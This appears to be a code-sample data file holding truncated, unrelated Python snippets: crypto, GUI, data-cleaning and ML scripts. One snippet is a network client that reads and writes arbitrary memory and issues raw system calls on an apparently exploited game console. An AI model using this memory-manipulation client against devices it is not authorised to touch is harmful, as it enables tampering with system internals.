AES.MODE_CFB, iv)\r\n\r\n# \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c iv (\u0432\u0435\u043a\u0442\u043e\u0440 \u043a\u043b\u044e\u0447\u0430) \u0432 \u043d\u0430\u0447\u0430\u043b\u043e \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u043d\u043e\u0433\u043e \u0448\u0438\u0444\u0440\u043e\u0442\u0435\u043a\u0441\u0442\u0430\r\n# \u0438 \u043f\u0435\u0440\u0435\u0434\u0430\u0435\u043c \u0435\u0433\u043e \u0432\u043c\u0435\u0441\u0442\u0435\r\nciphertext = iv + mycipher.encrypt(plain_text.encode())\r\n\r\n# \u0414\u043b\u044f \u0440\u0430\u0441\u0448\u0438\u0444\u0440\u043e\u0432\u043a\u0438 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0439\u0442\u0435 \u043a\u043b\u044e\u0447 \u0438 iv \u0434\u043b\u044f \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u043d\u043e\u0432\u043e\u0433\u043e \u043e\u0431\u044a\u0435\u043a\u0442\u0430 AES\r\nmydecrypt = AES.new(key, AES.MODE_CFB, ciphertext[:16])\r\n\r\n# \u0418\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0439\u0442\u0435 freshly generated AES \u043e\u0431\u044a\u0435\u043a\u0442 \u0434\u043b\u044f \u0440\u0430\u0441\u0448\u0438\u0444\u0440\u043e\u0432\u043a\u0438 \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u043d\u043e\u0433\u043e \u0448\u0438\u0444\u0440\u043e\u0442\u0435\u043a\u0441\u0442\u0430\r\ndecrypttext = mydecrypt.decrypt(ciphertext[16:])\r\n\r\n# \u0412\u044b\u0432\u043e\u0434\r\nfile_out = open(\"encrypted.bin\", \"wb\")\r\nfile_out.write(ciphertext[16:])\r\nfile_out.close()\r\n\r\nprint(\"\u041a\u043b\u044e\u0447 k: \", key)\r\nprint(\"iv: \", b2a_hex(ciphertext)[:16])\r\nprint(\"\u0417\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435: \", b2a_hex(ciphertext)[16:])\r\nprint(\"\u0420\u0430\u0441\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435: \", decrypttext.decode())",
    "# may or may not be inspired by plutoo's ctrrpc\nimport errno\nimport socket\nimport os\nimport sys\nimport struct\nimport codecs\nfrom time import sleep\n\ndef buffer(size):\n    return bytearray([0x00] * size)\n\ndef copy_string(buffer, s, offset):\n    s += \"\\0\"\n    buffer[offset : (offset + len(s))] = bytearray(s, \"ascii\")\n\ndef copy_word(buffer, w, offset):\n    buffer[offset : (offset + 4)] = struct.pack(\">I\", w)\n\ndef get_string(buffer, offset):\n    s = buffer[offset:]\n    if b'\\x00' in s:\n        return s[:s.index(b'\\x00')].decode(\"utf-8\")\n    else:\n        return s.decode(\"utf-8\")\n\nclass wupclient:\n    s=None\n\n    def __init__(self, ip='192.168.0.0', port=1337):\n        self.s=socket.socket()\n        self.s.connect((ip, port))\n        self.fsa_handle = None\n        self.cwd = \"/vol/storage_mlc01\"\n\n    def __del__(self):\n        if self.fsa_handle != None:\n            self.close(self.fsa_handle)\n            self.fsa_handle = None\n\n    # fundamental comms\n    def send(self, command, data):\n        request = struct.pack('>I', command) + data\n\n        self.s.send(request)\n        response = self.s.recv(0x600)\n\n        ret = struct.unpack(\">I\", response[:4])[0]\n        return (ret, response[4:])\n\n    # core commands\n    def read(self, addr, len):\n        data = struct.pack(\">II\", addr, len)\n        ret, data = self.send(1, data)\n        if ret == 0:\n            return data\n        else:\n            print(\"read error : %08X\" % ret)\n            return None\n\n    def send_and_exit(self, command, data):\n        request = struct.pack('>I', command) + data\n        self.s.send(request)\n        self.s.close()\n        self.s = None\n        self.fsa_handle = None\n        exit()\n\n    def write(self, addr, data):\n        data = struct.pack(\">I\", addr) + data\n        ret, data = self.send(0, data)\n        if ret == 0:\n            return ret\n        else:\n            print(\"write error : %08X\" % ret)\n            return None\n\n    def svc(self, svc_id, arguments):\n        data = struct.pack(\">I\", svc_id)\n        for a in arguments:\n            data += struct.pack(\">I\", a)\n        ret, data = self.send(2, data)\n        if ret == 0:\n            return struct.unpack(\">I\", data)[0]\n        else:\n            print(\"svc error : %08X\" % ret)\n            return None\n\n    def svc_and_exit(self, svc_id, arguments):\n        data = struct.pack(\">I\", svc_id)\n        for a in arguments:\n            data += struct.pack(\">I\", a)\n        self.send_and_exit(2, data)\n\n    def kill(self):\n        ret, _ = self.send(3, bytearray())\n        return ret\n\n    def memcpy(self, dst, src, len):\n        data = struct.pack(\">III\", dst, src, len)\n        ret, data = self.send(4, data)\n        if ret == 0:\n            return ret\n        else:\n            print(\"memcpy error : %08X\" % ret)\n            return None\n\n    def repeatwrite(self, dst, val, n):\n        data = struct.pack(\">III\", dst, val, n)\n        ret, data = self.send(5, data)\n        if ret == 0:\n            return ret\n        else:\n            print(\"repeatwrite error : %08X\" % ret)\n            return None\n\n    # derivatives\n    def alloc(self, size, align = None):\n        if size == 0:\n            return 0\n        if align == None:\n            return self.svc(0x27, [0xCAFF, size])\n        else:\n            return self.svc(0x28, [0xCAFF, size, align])\n\n    def free(self, address):\n        if address == 0:\n            return 0\n        return self.svc(0x29, [0xCAFF, address])\n\n    def load_buffer(self, b, align = None):\n        if len(b) == 0:\n            return 0\n        address = self.alloc(len(b), align)\n        self.write(address, b)\n        return address\n\n    def load_string(self, s, align = None):\n        return self.load_buffer(bytearray(s + \"\\0\", \"ascii\"), align)\n\n    def open(self, device, mode):\n        address = self.load_string(device)\n        handle = self.svc(0x33, [address, mode])\n        self.free(address)\n        return handle\n\n    def close(self, handle):\n        return self.svc(0x34, [handle])\n\n    def ioctl(self, handle, cmd, inbuf, outbuf_size):\n        in_address = self.load_buffer(inbuf)\n        out_data = None\n        if outbuf_size > 0:\n            out_address = self.alloc(outbuf_size)\n            ret = self.svc(0x38, [handle, cmd, in_address, len(inbuf), out_address, outbuf_size])\n            out_data = self.read(out_address, outbuf_size)\n            self.free(out_address)\n        else:\n            ret = self.svc(0x38, [handle, cmd, in_address, len(inbuf), 0, 0])\n        self.free(in_address)\n        return (ret, out_data)\n\n    def iovec(self, vecs):\n        data = bytearray()\n        for (a, s) in vecs:\n            data += struct.pack(\">III\", a, s, 0)\n        return self.load_buffer(data)\n\n    def ioctlv(self, handle, cmd, inbufs, outbuf_sizes, inbufs_ptr = [], outbufs_ptr = []):\n        inbufs = [(self.load_buffer(b, 0x40), len(b)) for b in inbufs]\n        outbufs = [(self.alloc(s, 0x40), s) for s in outbuf_sizes]\n        iovecs = self.iovec(inbufs + inbufs_ptr + outbufs_ptr + ",
    "import customtkinter as ctk\nfrom tkinter import messagebox\nw=ctk.CTk()\nglobal ssa1,pt1,ssa2,sa1,fa1,ssa3var,pt2,ssa4var,sa2,fa2,namevar,rollvar\nssa1var=ctk.StringVar()\npt1=ctk.StringVar()\nssa2var=ctk.StringVar()\nsa1=ctk.StringVar()\nfa1=ctk.StringVar()\nssa3var=ctk.StringVar()\npt2=ctk.StringVar()\nssa4var=ctk.StringVar()\nsa2=ctk.StringVar()\nfa2=ctk.StringVar()\nnamevar=ctk.StringVar()\nrollvar=ctk.StringVar()\ndef window():\n    w.title('Internal calculator')\n    w.geometry('1300x800+0+0')\n    w.resizable(False,False)\n    w._set_appearance_mode('Dark')\ndef calculate():\n    n1=ssa1var.get()\n    n2=ssa2var.get()\n    n3=pt1.get()\n    n4=sa1.get()\n    n5=fa1.get()\n    n6=ssa3var.get()\n    n7=ssa4var.get()\n    n8=pt2.get()\n    n9=sa2.get()\n    n10=fa2.get()\n    n11=namevar.get()\n    n12=rollvar.get()\n    if(n1==\"\" or n2==\"\" or n3==\"\" or n4==\"\" or n5==\"\" or n6==\"\" or n7==\"\" or n8==\"\" or n9==\"\" or n10==\"\" or n11==\"\" or n12==\"\"):\n        messagebox.showerror('invalid','enter all details')\n    elif(float(n1)<0 or float(n2)<0 or float(n3)<0 or float(n4)<0 or float(n5)<0 or float(n6)<0 or float(n7)<0 or float(n8)<0 or float(n9)<0 or float(n10)<0 ):\n        messagebox.showerror('invalid','enter +ve numbers')\n    elif(float(n1)>20 or float(n2)>20 or float(n3)>50 or float(n4)>100 or float(n5)>40 or float(n6)>20 or float(n7)>20 or float(n8)>50 or float(n9)>100 or float(n10)>40):\n        messagebox.showerror('error','Enter the number in range')\n    else:\n        newssa1=(float(n1)/20)*1\n        newpt1=(float(n3)/50)*2\n        newssa2=(float(n2)/20)*1\n        newsa1=(float(n4)/100)*8\n        newfa1=(float(n5)/40)*8\n        rel=newssa1+newpt1+newssa2+newsa1+newfa1\n        newrel='{:.3f}'.format(rel)\n        #result_out.configure(text=str(newrel))\n        newssa3=(float(n6)/20)*1\n        newpt2=(float(n8)/50)*2\n        newssa4=(float(n7)/20)*1\n        newsa2=(float(n9)/100)*8\n        newfa2=(float(n10)/40)*8\n        rel2=newssa3+newpt2+newssa4+newsa2+newfa2\n        newrel2='{:.3f}'.format(rel2)\n        TOT=rel+rel2\n        newTOT='{:.2f}'.format(TOT)\n        l1=str(newrel)\n        l2=str(newrel2)\n        result_out.configure(text=l1)\n        result2_out.configure(text=l2)\n        total_out.configure(text=str(newTOT))\n        #result2_out.configure(text=str(newrel))\ndef design1():\n    #heading\n    global ssa1_entry,PT_entry,ssa2_entry,cia1_entry,fa1_entry,result_out,name_entry,roll_entry\n    head=ctk.CTkLabel(w,text='Internal calculator',text_color='blue',font=('impact',40))\n    head.place(x=490,y=30)\n    #name lable\n    name=ctk.CTkLabel(w,text='Name :',text_color='white',font=('microsoft yahi ui light',20,'bold'))\n    name.place(x=100,y=140)\n    #name entry\n    name_entry=ctk.CTkEntry(w,border_width=1,width=200,height=30,font=('microsoft yahi ui light',16,'bold'),textvariable=namevar)\n    name_entry.place(x=200,y=140)\n     # rollnumber\n    roll=ctk.CTkLabel(w,text='Roll :',text_color='white',font=('microsoft yahi ui light',20,'bold'))\n    roll.place(x=490,y=140)\n    # rollnumber entry\n    roll_entry=ctk.CTkEntry(w,border_width=1,width=190,height=30,font=('microsoft yahi ui light',16,'bold'),textvariable=rollvar)\n    roll_entry.place(x=590,y=140)\n    #lable1\n    ssa1=ctk.CTkLabel(w,text='SSA 1:',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    ssa1.place(x=100,y=230)\n    #entry\n    ssa1_entry=ctk.CTkEntry(w,border_width=1,width=140,height=30,font=('microsoft yahi ui light',16,'bold'),textvariable=ssa1var)\n    ssa1_entry.place(x=200,y=229)\n    #lable1\n    ssa1_out=ctk.CTkLabel(w,text='/ 20',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    ssa1_out.place(x=370,y=230)\n    #lable2\n    PT=ctk.CTkLabel(w,text='PT 1:',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    PT.place(x=100,y=310)\n    #entry 2\n    PT_entry=ctk.CTkEntry(w,border_width=1,width=140,height=30,font=('microsoft yahi ui light',16,'bold'),textvariable=pt1)\n    PT_entry.place(x=200,y=310)\n    #lable2 \n    PT_out=ctk.CTkLabel(w,text='/ 50',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    PT_out.place(x=370,y=310)\n    #lable3\n    ssa2=ctk.CTkLabel(w,text='SSA 2:',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    ssa2.place(x=100,y=390)\n    #entry 3\n    ssa2_entry=ctk.CTkEntry(w,border_width=1,width=140,height=30,font=('microsoft yahi ui light',16,'bold'),textvariable=ssa2var)\n    ssa2_entry.place(x=200,y=390)\n    #lable 3\n    ssa2_out=ctk.CTkLabel(w,text='/ 20',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    ssa2_out.place(x=370,y=390)\n    #lable 4\n    cia1=ctk.CTkLabel(w,text='SA 1:',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    cia1.place(x=100,y=470)\n    #entry 4\n    cia1_entry=ctk.CTkEntry(w,border_width=1,width=140,height=30,font=('microsoft yahi ui light',16,'bold'),textvariable=sa1)\n    cia1_entry.place(x=200,y=470)\n    #lable 4\n    cia1_out=ctk.CTkLabel(w,text='/ 100',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    ",
    "class Student:\n    student_count = 0\n\n    def __init__(self, first_name, last_name, year, median):\n        self.first_name = first_name\n        self.last_name = last_name\n        self.year = year\n        self.median = median\n        Student.student_count += 1\n\n    def displayStudent(self):\n        print(f\"\"\"Imi\u0119: {self.first_name} {self.last_name}\nRok studi\u00f3w: {self.year}\n\u015arednia ocen: {self.median}\\n\"\"\")\n\n    @classmethod\n    def displayCount(cls):\n        print(f\"Aktualna liczba student\u00f3w: {cls.student_count}\")\n\ndef create_students():\n    students = []\n\n    student1 = Student(\"Szymon\", \"Wiezowski\", 4, 4.5)\n    student2 = Student(\"Kuba\", \"Kubek\", 1, 2)\n    student3 = Student(\"Jan\", \"Brzechwa\", 3, 4.2)\n\n    students.extend([student1, student2, student3])\n\n    return students\n\ndef displayStudentCLS(student):\n    student.displayStudent()\n\ndef existCheck(student_list, first_name, last_name):\n    for student in student_list:\n        if student.first_name == first_name and student.last_name == last_name:\n            return True\n    print(f\"\\nStudent {first_name} {last_name} nie istnieje.\")\n    return False\n\nif __name__ == \"__main__\":\n    students_list = create_students()\n    Student.displayCount()\n\n    for student in students_list:\n        displayStudentCLS(student)\n\n    fName = \"Szymon\"\n    lName = \"Wiezowski\"\n    if existCheck(students_list, fName, lName):\n        print(f\"\\nDane studenta {fName} {lName}:\")\n        for student in students_list:\n            if student.first_name == fName and student.last_name == lName:\n                student.displayStudent()\n",
    "import csv\nimport pandas as pd\nimport streamlit as st\n\ndef log_choice(id, message_id, chosen_email):\n    \"\"\"Logs the user's choice to a CSV file.\"\"\"\n    with open('email_choices.csv', 'a', newline='') as file:\n        fieldnames = ['id', 'message_id', 'chosen_email']\n        writer = csv.DictWriter(file, fieldnames=fieldnames)\n        # Check if we need to write the header\n        file.seek(0)\n        if file.tell() == 0:\n            writer.writeheader()\n        writer.writerow({'id': id, 'message_id': message_id, 'chosen_email': chosen_email})\n\ndef get_first_row(csv_path):\n    data = pd.read_csv(csv_path)\n    return data.iloc[0]\n\ndef display_email(content, key, background_color = \"#ffffe6\"):\n    \"\"\"Display an email with the given content and background color.\"\"\"\n    st.markdown(f\"\"\"\n        <div style='background-color:{background_color}; color: black; padding: 10px; border-radius: 10px;'>\n            <p style='white-space: pre-wrap;'>{content}</p>\n        </div>\n        \"\"\", unsafe_allow_html=True)\n    if st.button(f'Choose Email {key}'):\n        return True\n    return False\n\ndef set_button_style():\n    \"\"\"Sets the button style for the Streamlit app. (currently makes both buttons blue)\"\"\"\n    button_style = \"\"\"\n    <style>\n        .stButton>button {\n            border: 2px solid #4a8aeb;\n            color: white;\n            background-color: #4a8aeb;\n            padding: 10px 24px;\n            border-radius: 5px;\n            cursor: pointer;\n        }\n        .stButton>button:hover {\n            border: 2px solid #0b6cc1;\n            background-color: #0b6cc1;\n        }\n    </style>\n    \"\"\"\n    st.markdown(button_style, unsafe_allow_html=True)",
    "import os\nimport numpy as np\nimport random\nimport shutil\n\ndef create_dataset(dataset_folder,data_folder,image_list):\n\n\tfor image in image_list:\n\n\t\timage_src_path=data_folder+image+'.jpg'\n\t\timage_dst_path=dataset_folder+os.sep+image+'.jpg'\n\n\t\tshutil.copy2(image_src_path,image_dst_path)\n\n\t\tbbox_src_path = data_folder + image + '.txt'\n\t\tbbox_dst_path = dataset_folder +os.sep+image+'.txt'\n\t\tshutil.copy2(bbox_src_path, bbox_dst_path)\n\n\t\tmask_src_path = data_folder + image + '.npz'\n\t\tmask_dst_path = dataset_folder + os.sep + image + '.npz'\n\t\tshutil.copy2(mask_src_path, mask_dst_path)\n\n\ndata_folder='D:/DLCode/wgisd/data/'\ntrain_masked_path ='D:/DLCode/wgisd/train_masked.txt'\n\nROOT_DIR = os.path.abspath(\".\")\nprint(ROOT_DIR)\n\n# load the names of the images\nwith open(train_masked_path, 'r') as fp:\n    data_list = fp.readlines()\n\ndata_list = set([i[:-1] for i in data_list])\n\n# split\ndata_list=sorted(data_list)\nrandom.shuffle(data_list)\n\ni = int(len(data_list) * 0.8)\ndata_list_train = data_list[:i]\ndata_list_val = data_list[i:]\n\n#create dataset folder\ndataset_folder= os.path.sep.join([ROOT_DIR,\"dataset\"])\nif not os.path.exists(dataset_folder):\n\tos.makedirs(dataset_folder)\n\n#build train dataset\ndataset_folder_train= os.path.sep.join([dataset_folder,\"train\"])\nif not os.path.exists(dataset_folder_train):\n\tos.makedirs(dataset_folder_train)\ncreate_dataset(dataset_folder_train,data_folder,data_list_train)\n\n# build Validation dataset\ndataset_folder_val= os.path.sep.join([dataset_folder,\"val\"])\nif not os.path.exists(dataset_folder_val):\n\tos.makedirs(dataset_folder_val)\ncreate_dataset(dataset_folder_val,data_folder,data_list_val)\n\n#for i in data_list:\n#   print(i)\n\nprint(\"\\ntrain:{},val:{}\".format(len(data_list_train),len(data_list_val)))\n\n",
    "#\r\n# Developer and Project Information:\r\n#\r\n# Name: Object Detection \r\n# Developed by: Niraj Nepal\r\n# Code Sourced Citations: https://www.geeksforgeeks.org/object-detection-using-tensorflow/ (Modified this code for Object_Detection_Main.py)\r\n# Date: April 19, 2024\r\n#\r\n\r\nimport tensorflow as tf\r\nimport numpy as np\r\nimport cv2\r\nfrom PIL import Image\r\nfrom matplotlib import pyplot as plt\r\nimport os\r\nimport sys\r\nimport time\r\n\r\n\r\n# Configuration section with paths and label information for ML Model and Image being test\r\n\r\nMODEL_PATH = \"C:/Users/pokem/OneDrive/Desktop/Python stuff/AI-Object-Detection/models/custom_model_lite/detect.tflite\"\r\nIMAGE_PATH = \"C:/Users/pokem/OneDrive/Desktop/Python stuff/AI-Object-Detection/Images/image_test_10.png\"\r\nLABELS = [None] * 10 + [\"person\"]\r\n\r\n\r\ndef load_model(tflite_model_path):\r\n    \"\"\"\r\n    Load the TensorFlow Lite model from the specified path and allocate tensors.\r\n\r\n    This function initializes the TensorFlow Lite interpreter with the model\r\n    specified by the `tflite_model_path`. It then allocates tensors for the model,\r\n    preparing it for inference. This is a necessary step before performing any\r\n    predictions with the model.\r\n\r\n    Parameters:\r\n    - tflite_model_path (str): The file path to the TensorFlow Lite model file.\r\n\r\n    Returns:\r\n    - interpreter (tf.lite.Interpreter): The loaded and initialized TensorFlow Lite\r\n      interpreter object, ready for performing inference.\r\n\r\n    Usage:\r\n    - To use this function, provide the path to your TensorFlow Lite model file.\r\n      The function will return an interpreter object which can be used to perform\r\n      inference with the model.\r\n    \"\"\"\r\n    interpreter = tf.lite.Interpreter(model_path=tflite_model_path)\r\n    interpreter.allocate_tensors()\r\n    return interpreter\r\n\r\n\r\ndef load_and_prepare_image(image_path, model_input_shape=(320, 320)):\r\n    \"\"\"\r\n    Load an image from the specified path, convert it to RGB, resize it to the specified model input shape,\r\n    normalize its pixel values to the range [0, 1], and convert it into a tensor suitable for model input.\r\n\r\n    This function is designed to prepare images for inference with a TensorFlow model. The image is first\r\n    checked for existence at the given path. It is then opened, converted to RGB (if not already in that format),\r\n    and resized to match the input shape expected by the model. The pixel values are normalized to fall within\r\n    the range [0, 1], which is a common requirement for neural network inputs. Finally, the image is converted\r\n    to a TensorFlow tensor, and a batch dimension is added to make the image tensor compatible with the model's\r\n    expected input format.\r\n\r\n    Parameters:\r\n    - image_path (str): The file path to the image to be loaded and prepared.\r\n    - model_input_shape (tuple of int, optional): The height and width to which the image should be resized,\r\n      specified as (height, width). Defaults to (320, 320).\r\n\r\n    Returns:\r\n    - tf.Tensor: A tensor representing the processed image, ready to be fed into a TensorFlow model for inference.\r\n\r\n    Usage:\r\n    - This function can be used to prepare images for object detection or classification models that require\r\n      input images to be in a specific format. It simplifies the process of image preprocessing for inference.\r\n    \"\"\"\r\n    if not os.path.exists(image_path):\r\n        raise FileNotFoundError(f\"Image path {image_path} does not exist.\")\r\n    image = Image.open(image_path)\r\n    image = image.convert('RGB')\r\n    image = image.resize(model_input_shape)\r\n    image_np = np.array(image)\r\n    image_np = image_np / 255.0 \r\n    image_tensor = tf.convert_to_tensor(image_np, dtype=tf.float32) \r\n    image_tensor = tf.expand_dims(image_tensor, 0) \r\n    return image_tensor\r\n\r\n\r\ndef run_inference(interpreter, image_tensor):\r\n    \"\"\"\r\n    Perform inference on an input image tensor using the provided TensorFlow Lite interpreter.\r\n\r\n    This function sets the input tensor of the interpreter to the provided image tensor, invokes the interpreter\r\n    to perform inference, and then collects the output tensors. These outputs typically include detection boxes,\r\n    scores, and classes for object detection models. Additionally, the number of detections is also retrieved.\r\n    The shapes of the output tensors are printed for debugging purposes.\r\n\r\n    Parameters:\r\n    - interpreter (tf.lite.Interpreter): The TensorFlow Lite interpreter initialized with a model.\r\n    - image_tensor (tf.Tensor): The input image tensor to run inference on.\r\n\r\n    Returns:\r\n    - dict: A dictionary containing the inference results, including detection boxes, scores, classes,\r\n      and the number of detections.\r\n\r\n    Usage:\r\n    - This function is intended to be used with TensorFlow Lite models that perform object detection.\r\n      It requires a pre-loaded and initialized interpreter and an image tensor prepared according to the\r\n      model's expected input format. The function facilitates the pr",
    "\"\"\"\nEste m\u00f3dulo define a las funciones que realizan en el procesamiento\nlos datos extra\u00eddos de la API. Las tareas realizadas son:\n1 - Elimina los registros duplicados.\n2 - Elimina registros de datos que no tienen fecha/hora resgitrada.\n3 - Completa con \"NaN\" los datos faltantes del campo indicado\n4 - Se para el campo de tiempo en a\u00f1o/mes/d\u00eda/hora/minutos\n5 - Modifica el tipo de datos para optimizar en memoria.\n6 - \n\"\"\"\n\n# Se importan las librerias necesarias\nimport pandas as pd\nimport os\nfrom datetime import datetime, timedelta\nimport numpy as np\n\n\n# Eliminaci\u00f3n de registros duplicados\ndef duplicados(df):\n    \"\"\"\n    Elimina los registros duplicados en los datos almacenados\n    en los archivos parquet alojados en la capa \"Landing\" del Data Lake.\n\n    :param df: Indica el data frame con los datos.\n\n    :type [df]: [pandas.core.frame.DataFrame]\n\n    :return: [Metadatos o Datos de la estaci\u00f3n seleccionada]\n    :rtype: [pandas.core.frame.DataFrame]\n    \"\"\"\n\n    try:\n        df_sin_duplicados = df.drop_duplicates()\n        return df_sin_duplicados\n    \n    except:\n        print(\"No se pudo realizar eliminar los registros duplicados.\")\n        return None        \n\n\ndef elimnar_reportes_nulos(df, campo):\n    \"\"\"\n    Elimina los registros sin identificador de fecha y hora en los datos\n    almacenados en los archivos parquet, alojados en la capa \"Landing\"\n    del Data Lake.\n\n    :param df: Indica el data frame con los datos.\n    :param campo: Indica el campo en el que se detectan faltantes.\n\n    :type [df]: [pandas.core.frame.DataFrame]\n\n    :return: [Meta. o Datos de la estaci\u00f3n seleccionada]\n    :rtype: [pandas.core.frame.DataFrame]\n    \"\"\"\n\n    try:\n        df_sin_fecha_y_hora = df.dropna(subset=[campo])\n        return df_sin_fecha_y_hora\n    \n    except:\n        print(\"No se pudo eliminar registros sin fecha y hora.\")\n        return None        \n\n\ndef imputacion_metadatos_nulos(df):\n    \"\"\"\n    Asigna valores por defecto a los registros almacenados\n    en el archivo parquet (alojados en la capa \"Landing\"\n    del Data Lake).\n\n    :param df: Indica el data frame con los datos.\n\n    :type [df]: [pandas.core.frame.DataFrame]\n\n    :return: [Datos de la estaci\u00f3n seleccionada]\n    :rtype: [pandas.core.frame.DataFrame]\n    \"\"\"\n\n    try:\n        imputation_mapping = {\n        'icaoId': \"Sin Dato\",\n        'lat': np.nan,\n        'lon': np.nan,\n        'elev': np.nan,\n        'country': \"Sin Dato\"\n        }\n\n        df_impugnado = df.fillna(imputation_mapping)\n        return df_impugnado\n\n    except:\n        print(\"No se pudo asignar valores por defecto a los faltantes.\")\n        return None        \n\n\ndef imputacion_datos_nulos(df, campo):\n    \"\"\"\n    Asigna a los registros almacenados en los archivos parquet (alojados\n    en la capa \"Landing\" del Data Lake) con valores de temperatura nulos\n    el valor por defecto \"NaN\" .\n\n    :param df: Indica el data frame con los datos.\n    :param campo: Indica el campo (Temp.) en el que se detectan faltantes.\n\n    :type [df]: [pandas.core.frame.DataFrame]\n\n    :return: [Datos de la estaci\u00f3n seleccionada]\n    :rtype: [pandas.core.frame.DataFrame]\n    \"\"\"\n\n    try:\n        imputation_mapping = {\n        campo: np.nan\n        }\n\n        df_impugnado = df.fillna(imputation_mapping)\n        return df_impugnado\n\n    except:\n        print(\"No se pudo asignar valores por defecto a los faltantes.\")\n        return None        \n\n\ndef separador_campo_time(df, campo):\n    \"\"\"\n    A los valores de fecha/hora almacenados en los archivos parquet\n    (alojados en la capa \"Landing\" del Data Lake) los separa en campos\n    de: a\u00f1o, mes, d\u00eda, hora y minutos. Adem\u00e1s, elimina el campo original.\n\n    :param df: Indica el data frame con los datos.\n    :param campo: Indica el campo (Temp.) en el que se detectan faltantes.\n\n    :type [df]: [pandas.core.frame.DataFrame]\n\n    :return: [Datos de la estaci\u00f3n seleccionada]\n    :rtype: [pandas.core.frame.DataFrame]    \n    \"\"\"\n\n    try:    \n        # Se paramos los elementos por los caracteres \":\",\" \" y \"-\" \n        df[campo] = df[campo].str.split(r'[: \\-]')\n        # Asignamos los valores separados a nuevos campos\n        df[\"anno\"] = df[campo].str[0]\n        df[\"mes\"] = df[campo].str[1]\n        df[\"dia\"] = df[campo].str[2]\n        df[\"hora\"] = df[campo].str[3]\n        df[\"minuto\"] = df[campo].str[4]\n\n        # Descartamos el campo original\n        df = df.drop(campo, axis=1)\n        return df\n\n    except:\n        print(\"No se pudo separar el reporte de fecha y hora.\")\n        return None        \n\n\ndef formato_datos(df):\n    \"\"\"\n    Modifica el tipo de dato de los Datos almacenados\n    en los archivos parquet alojados en el Data Lake.\n    Asigna el tipo de dato que mejor se ajusta, para\n    minimizar el espacio en memoria.\n\n    :param df: Indica el data frame con los datos.\n\n    :type [df]: [pandas.core.frame.DataFrame]\n\n    :return: [Datos de la estaci\u00f3n seleccionada]\n    :rtype: [pandas.core.frame.DataFrame]\n    \"\"\"\n\n    try:\n        conversion_mapping = {\n       ",
    "import tensorflow as tf\r\nimport matplotlib.pyplot as plt\r\n\r\n\r\nmnist = tf.keras.datasets.mnist\r\n(X_train, Y_train), (X_test, Y_test) = mnist.load_data()\r\n\r\nX_train = X_train / 255.0  # Normalize pixel values to be between 0 and 1\r\nX_train = X_train.reshape(X_train.shape[0], X_train.shape[1], X_train.shape[2], 1) # Additional dimension for color\r\nY_train = tf.keras.utils.to_categorical(Y_train)\r\nprint(\"Shape X_train\", X_train.shape) # X_train is a 4D matrix\r\n\r\nmodel = tf.keras.models.Sequential()\r\n\r\n# Add Convolutional Layers\r\nmodel.add(tf.keras.layers.Conv2D(filters=32, kernel_size=(3, 3), activation='relu', input_shape=(28, 28, 1)))\r\nmodel.add(tf.keras.layers.Conv2D(filters=64, kernel_size=(3, 3), activation='relu'))\r\nmodel.add(tf.keras.layers.MaxPooling2D(pool_size=(2, 2)))\r\nmodel.add(tf.keras.layers.Dropout(0.25))\r\n\r\n# Add Pooling Layers (MaxPooling2D or AveragePooling2D)\r\nmodel.add(tf.keras.layers.MaxPooling2D(pool_size=(2, 2)))\r\n\r\n# Flatten the Output\r\nmodel.add(tf.keras.layers.Flatten())\r\n\r\n# Add Fully Connected Layers\r\nmodel.add(tf.keras.layers.Dense(units=128, activation='relu'))\r\nmodel.add(tf.keras.layers.Dropout(0.5))  # Dropout layer for regularization\r\nmodel.add(tf.keras.layers.Dense(units=10, activation='softmax'))  # Output layer with softmax activation\r\n\r\nmodel.compile(loss='categorical_crossentropy',\r\n              optimizer='adam',\r\n              metrics=['accuracy'])\r\n\r\n# Display the model summary\r\nmodel.summary()\r\n\r\n# Train the model (if not already trained)\r\nmodel.fit(X_train, Y_train, epochs=10, batch_size=32, validation_split=0.2)\r\n\r\n# Evaluate the model on the test data\r\ntest_loss, test_accuracy = model.evaluate(X_test, tf.keras.utils.to_categorical(Y_test))\r\n\r\n# Print the evaluation results\r\nprint(\"Test Loss:\", test_loss)\r\nprint(\"Test Accuracy:\", test_accuracy)\r\n\r\nmodel.save(\"Model.h5\")\r\n\r\nimport pygame\r\nimport numpy as np\r\n\r\n# Load the model\r\nmodel = tf.keras.models.load_model(\"Model.h5\")\r\n\r\npygame.init() # initialize Pygame\r\nBLACK = (0, 0, 0) # defining black color\r\nWHITE = (255, 255, 255) # defining black color\r\n\r\n# Set up the display\r\nWIDTH, HEIGHT = 400, 400\r\nwindow = pygame.display.set_mode((WIDTH, HEIGHT))\r\npygame.display.set_caption(\"Handwritten Digit Recognition\")\r\n\r\nwindow.fill(WHITE)\r\n\r\ndrawing = False  # To track whether the user is drawing\r\nlast_pos = None  # To store the previous mouse position for smooth lines\r\nradius = 15 # To define the font size of the drawing tool\r\n\r\ndef predict_digit(img):\r\n    img = tf.image.resize(img, [28, 28])\r\n    img = tf.reshape(img, (1, 28, 28, 1))\r\n    img = img / 255.0\r\n    img = tf.image.transpose(img)\r\n    img = 1.0 - img\r\n    prediction = model.predict(img)\r\n    print(\"Raw Prediction Scores:\", prediction)\r\n    digit = np.argmax(prediction)\r\n    return digit\r\n\r\ndef display_text(text):\r\n    font = pygame.font.Font(None, 72)\r\n    text_surface = font.render(text, True, BLACK)\r\n    text_rect = text_surface.get_rect(topright=(WIDTH - 20, 20))\r\n    window.blit(text_surface, text_rect)\r\n\r\n# Main loop\r\nrunning = True\r\nwhile running:\r\n    for event in pygame.event.get():\r\n        if event.type == 